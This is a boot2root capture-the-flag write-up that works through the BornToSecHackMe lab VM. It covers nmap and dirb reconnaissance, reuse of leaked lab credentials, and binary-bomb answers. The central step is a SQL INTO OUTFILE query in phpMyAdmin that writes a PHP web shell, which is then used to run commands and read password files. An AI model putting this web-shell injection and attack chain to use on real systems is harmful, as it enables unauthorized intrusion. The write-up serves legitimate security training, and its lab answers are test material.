# Explore ISO file
Mount ISO file
```sh
┌──$ [~/42/2022/boot2root]
└─>  hdiutil mount BornToSecHackMe-v1.1.iso
/dev/disk2               /Volumes/BornToSec
```

Start explore ISO file before installing a VM.
```sh
┌──$ [~/42/2022/boot2root]
└─>  cd /Volumes/BornToSec
┌──$ [/Volumes/BornToSec]
└─>  tree -a
.
├── .disk
│   ├── base_installable
│   ├── cd_type
│   ├── info
│   └── release_notes_url
├── README.diskdefines              # file which may be referenced during installation
├── casper                          # folder containing the read-only part of the file system
│   ├── README.diskdefines          # file which may be referenced during installation
│   ├── filesystem.manifest         # file which contains information about the installation packages
│   ├── filesystem.manifest-desktop # file which contains information about the installation packages
│   ├── filesystem.size             # the required disk space for OS is usually twice the amount of bytes found in this file
│   ├── filesystem.squashfs         # read-only file system which is especially used to create Live CD
│   ├── initrd.gz                   # Gzip compressed data which provides the capability to load a RAM disk by the boot loader
│   └── vmlinuz                     # Linux kernel x86 boot executable
├── install
│   └── memtest
├── isolinux                        # the folder containing the loader isolinux.bin. It will search for the config file directory in the order /boot/isolinux, /isolinux, /
│   ├── boot.cat                    # file which is of no interest except it is required
│   ├── isolinux.bin                # a boot loader for ISO9660 (file system for CD-ROM disks)
│   ├── isolinux.cfg                # configuration file which contains directives settings for the color and the structure of the menu
│   ├── splash.png                  # screen image shown at boot
│   └── vesamenu.c32                # the program which displays the boot menu
├── md5sum.txt                      # fingerprint (checksum) of disk files
├── preseed                         # preseed allows to automate an installer by pre-specifying answers to installation questions
│   └── custom.seed                 # preconfiguration file
└── ubuntu

5 directories, 21 files
```











# Install ISO

Change the default networking mode of VM from NAT to Bridge to have more interaction between host machine and VM.
In bridged networking mode, the default gateway of VM is home router.
So, after start, VM will get the IP address in the same network range.
```sh
┌──$ [~/42/2022/boot2root]
└─>  VBoxManage modifyvm "boot2root" --nic1 bridged
```

Run the VM.
```sh
┌──$ [~/42/2022/boot2root]
└─>  VBoxManage startvm "boot2root" --type headless
Waiting for VM "boot2root" to power on...
VM "boot2root" has been successfully started.
```

Find the subnet address and the mask on which actuall device is running.
```sh
┌──$ [~/42/2022/boot2root]
└─>  ifconfig en0
en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	ether 4c:32:75:9a:8f:4f
	inet6 fe80::c8e:b7dd:85d9:5032%en0 prefixlen 64 secured scopeid 0x7
	inet 192.168.0.13 netmask 0xffffff00 broadcast 192.168.0.255
	nd6 options=201<PERFORMNUD,DAD>
	media: autoselect
	status: active
```

```
0xffffff00 -> 255.255.255.0
192.168.0.13 & 255.255.255.0 = 192.168.0.0/24
```

Run a scan with `-sn` option to perform only host discovery without port scanning (aka "pign scan")
```sh
┌──$ [~/42/2022/boot2root]
└─>  sudo nmap -sn 192.168.0.0/24
Password: ******************
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-18 17:44 CET
[...]
Nmap scan report for 192.168.0.21                              # boot2root IP address
Host is up (0.00035s latency).                                 # boot2root VM status
MAC Address: 08:00:27:AC:88:E4 (Oracle VirtualBox virtual NIC) # boot2root MAC address
-
Nmap scan report for 192.168.0.13                              # my host
Host is up.                                                    # my host status
Nmap done: 256 IP addresses (6 hosts up) scanned in 23.57 seconds
```

# Nmap - discover open ports

Once IP address is found, run a scan with  `-p-`, `-sV` and `-O` options to scan ports from 1 through 65535, enable service/version detection to determine what application is running and enable OS detection. Aggressive scan may be performed using option `-A`.
<details>
<summary>Output of nmap</summary>

```shell
┌──$ [~/42/2022/boot2root]
└─>  sudo nmap -p- -sV -O 192.168.0.21
Password: ******************
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 09:55 EDT
Nmap scan report for 192.168.0.21
Host is up (0.00048s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
MAC Address: 08:00:27:FD:21:F4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.10, Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.01 seconds
```
</details>



The scan reveals that a few serices are running and their corresponding ports.

# Dirb - path traversal
A [path traversal attack](https://owasp.org/www-community/attacks/Path_Traversal) can be performed on HTTP and HTTPS ports using **dirb**.

[**dirb**](https://www.kali.org/tools/dirb/) is a web content scanner which will looks for existing web objects. It basically works by launching a dictionary based attack.

Run **dirb** on port 80 reveal that only `index.html` and `fonts/` are accessible.
<details>
<summary>Output of dirb</summary>

```shell
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.0.21

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Mar 15 10:28:02 2022
URL_BASE: http://192.168.0.21/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.0.21/ ----
+ http://192.168.0.21/cgi-bin/ (CODE:403|SIZE:288)
==> DIRECTORY: http://192.168.0.21/fonts/
+ http://192.168.0.21/forum (CODE:403|SIZE:285)
+ http://192.168.0.21/index.html (CODE:200|SIZE:1025)
+ http://192.168.0.21/server-status (CODE:403|SIZE:293)

---- Entering directory: http://192.168.0.21/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Tue Mar 15 10:28:13 2022
DOWNLOADED: 4612 - FOUND: 4
```
</details>


Running same scan, with `-r` option, on HTTPS port 443, reveal `forum`, `phpmyadmin` and `webmail` accessible.
<details>
<summary>Output of dirb</summary>

```shell
┌──(kali㉿kali)-[~]
└─$ dirb https://192.168.0.21:443 /usr/share/dirb/wordlists/common.txt -r

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Mar 15 10:35:54 2022
URL_BASE: https://192.168.0.21:443/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.0.21:443/ ----
+ https://192.168.0.21:443/cgi-bin/ (CODE:403|SIZE:289)
==> DIRECTORY: https://192.168.0.21:443/forum/
==> DIRECTORY: https://192.168.0.21:443/phpmyadmin/
+ https://192.168.0.21:443/server-status (CODE:403|SIZE:294)
==> DIRECTORY: https://192.168.0.21:443/webmail/

-----------------
END_TIME: Tue Mar 15 10:36:13 2022
DOWNLOADED: 4612 - FOUND: 2
```
</details>


# Explore the forum
The forum on https://192.168.0.21:443/forum/, is claming in the title *HackMe*.

First, there is no way to create a new user, only to log in with existing one: `admin`, `lmezard`, `qudevide`, `thor`, `wandre` and `zaz`.

A post [Probleme login ?](https://192.168.0.21/forum/index.php?id=6) contains extract of `auth.log` file. `/var/log/auth.log` keeps authentication logs for successful or failed logins, and authentication processes.

Copy this log into a file and sort by users which tried to authentificate.
```shell
┌──$ [/tmp]
└─>  cat auth.log |  grep -o "user .* from" | sort -u
user !q\]Ej?*5K5cy*AJ from
user PlcmSpIp from
user adam from
user adm from
user admin from
user ftpuser from
user guest from
user nagios from
user naos from
user nvdb from
user pi from
user support from
user test from
user ubnt from
user user from
```
Only three users were succesefuly authenticated.
```shell
┌──$ [/tmp]
└─>  cat auth.log |  grep -o "session opened for user .*"  | sort -u
session opened for user admin by (uid=0)
session opened for user lmezard by (uid=1040)
session opened for user root by (uid=0)
session opened for user root by admin(uid=0)
session opened for user root by admin(uid=1000)
```
It seems clearly that user which tried to authentificate misstyped password instead of username `!q\]Ej?*5K5cy*AJ`. As succesefuly authenticated users are determined, try to log in forum under of one of those users.

The password allowed to authentificate on the [forum](https://192.168.0.21/forum) as `lmezard` user, but not on [webmail](https://192.168.0.21/webmail) and [phpmyadmin](https://192.168.0.21/phpmyadmin/).

On [Edit Profile](https://192.168.0.21/forum/index.php?mode=user&action=edit_profile) page the email of profile is `laurie@borntosec.net`.

# Webmail
Using the initial password `!q\]Ej?*5K5cy*AJ` and the `laurie@borntosec.net` allow to connect [webmail](https://192.168.0.21/webmail).

An email from `qudevide@mail.borntosec.net` contains credentials `root/Fg-'kKXBj87E:aJ$` to access DB [phpmyadmin](https://192.168.0.21/phpmyadmin/).

# phpMyAdmin - injection of web shell

Once logedd into [phpmyadmin](https://192.168.0.21/phpmyadmin/) a [webshell](https://en.wikipedia.org/wiki/Web_shell) can be injected using `OUTFILE` statement. But it requires to find a writtable directory of Apache web server where the webshell can be put in. To do so, **dirb** can be runned on [https://192.168.0.21/forum](https://192.168.0.21/forum).
<details>
<summary>Output of dirb</summary>

```shell
┌──(kali㉿kali)-[~]
└─$ dirb https://192.168.56.101/forum

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Apr  4 10:20:26 2022
URL_BASE: https://192.168.56.101/forum/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://192.168.56.101/forum/ ----
+ https://192.168.56.101/forum/backup (CODE:403|SIZE:295)                                                                           
+ https://192.168.56.101/forum/config (CODE:403|SIZE:295)                                                                           
==> DIRECTORY: https://192.168.56.101/forum/images/                                                                                 
==> DIRECTORY: https://192.168.56.101/forum/includes/                                                                               
+ https://192.168.56.101/forum/index (CODE:200|SIZE:4935)                                                                           
+ https://192.168.56.101/forum/index.php (CODE:200|SIZE:4935)                                                                       
==> DIRECTORY: https://192.168.56.101/forum/js/                                                                                     
==> DIRECTORY: https://192.168.56.101/forum/lang/                                                                                   
==> DIRECTORY: https://192.168.56.101/forum/modules/                                                                                
==> DIRECTORY: https://192.168.56.101/forum/templates_c/                                                                            
==> DIRECTORY: https://192.168.56.101/forum/themes/                                                                                 
==> DIRECTORY: https://192.168.56.101/forum/update/                                                                                 
                                                                                                                                    
[...]
                                                                               
-----------------
END_TIME: Mon Apr  4 10:20:30 2022
DOWNLOADED: 4612 - FOUND: 4

```
</details>


`/var/www/` is the default installation directory for Apache2 and forum is located inside this directory. So, trying to execute following SQL query allow to write a file into `/var/www/forum/templates_c/`. 
`templates_c` is a ...
```sql
SELECT "<pre><?php system($_GET['cmd'])?></pre>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'
```
Once the query is executed and confirmation message is prompted `Your SQL query has been executed successfully ( Query took 0.0002 sec )` the webshell can be accessed at [https://192.168.56.101/forum/templates_c/shell.php](https://192.168.56.101/forum/templates_c/shell.php). 

As the PHP super global variable `$_GET` is used to collect data sent in the URL, the parameters `cmd` is sent to shell.php and evaluated by `system()`.

So passing, for example, `id` in `cmd` parameter gives an output of executed command (https://192.168.56.101/forum/templates_c/shell.php?cmd=id)
```shell
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```
From here, find all file belongs to a user called “www-data” in / file system:
https://192.168.56.101/forum/templates_c/shell.php?cmd=find+/home+-user+www-data
```
/home
/home/LOOKATME
/home/LOOKATME/password
```
Running [cmd=cat /home/LOOKATME/password](https://192.168.56.101/forum/templates_c/pre.php?cmd=cat%20/home/LOOKATME/password) prints the content of the file which is credential to log into `lmezard`.
```
lmezard:G!@M6f4Eatau{sF"
```

# FTP
```shell
┌──(kali㉿kali)-[/tmp/b2r]
└─$ ftp lmezard@192.168.56.101
Connected to 192.168.56.101.
220 Welcome on this server
331 Please specify the password.
Password: G!@M6f4Eatau{sF"
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44578|)
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
ftp> mget *
mget README [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||15980|)
150 Opening BINARY mode data connection for README (96 bytes).
100% |****************************************************************************************|    96        2.28 MiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (515.10 KiB/s)
229 Entering Extended Passive Mode (|||51397|)
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |****************************************************************************************|   790 KiB   56.21 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (55.12 MiB/s)
```
Received files are an archive with a little challenge and a text file indicating that the password will allow to log as `laurie` in SSH.
```shell
┌──(kali㉿kali)-[/tmp/b2r]
└─$ file *                    
fun:    POSIX tar archive (GNU)
README: ASCII text
```
Extract files from an archive
```shell
┌──(kali㉿kali)-[/tmp/b2r]
└─$ tar -xf fun 
┌──(kali㉿kali)-[/tmp/b2r]
└─$ ls          
ft_fun  fun  README
┌──(kali㉿kali)-[/tmp/b2r]
└─$ ls -l ft_fun
total 3028
-rw-r----- 1 kali kali    26 Aug 13  2015 00M73.pcap
[...]
-rw-r----- 1 kali kali    28 Aug 13  2015 ZQTK1.pcap
```
`.pcap` extension are false trail. Those files are simple ASCII text files containing C line instructions and C-style comments.
The challenge here is to rebuild the program in C and get the password.

For this purpose a shell sciprt `fun.sh` is created. It gets all files containing a string 'file' in it, itterates over them and rename them according to file number in the comment. Finally it concatenate those files into main.c, compile it and execute.
```shell
┌──(kali㉿kali)-[/tmp/b2r/ft_fun]
└─$ ./fun.sh                           
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
┌──(kali㉿kali)-[/tmp/b2r/ft_fun]
└─$ echo -n Iheartpwnage | shasum -a256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

# SSH laurie
```shell
┌──(kali㉿kali)-[~]
└─$ ssh laurie@192.168.56.103
The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.
ECDSA key fingerprint is SHA256:d5T03f+nYmKY3NWZAinFBqIMEK1U0if222A1JeR8lYE.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.103' (ECDSA) to the list of known hosts.
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.103's password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
laurie@BornToSecHackMe:~$ 
```
Once logged into laurie, two file are located in home directory.
```shell
laurie@BornToSecHackMe:~$ ls
bomb  README
laurie@BornToSecHackMe:~$ file *
bomb:   ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped
README: ASCII text
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
```shell
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```
Diffusing stages of bomb are the password for thor user is `Publicspeakingisveryeasy.126241207201b2149opekmq426315`. 

But according to a [stackoverflow thread](https://stackoverflow.com/c/42network/questions/664), these is an error in the ISO file, the real password is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.
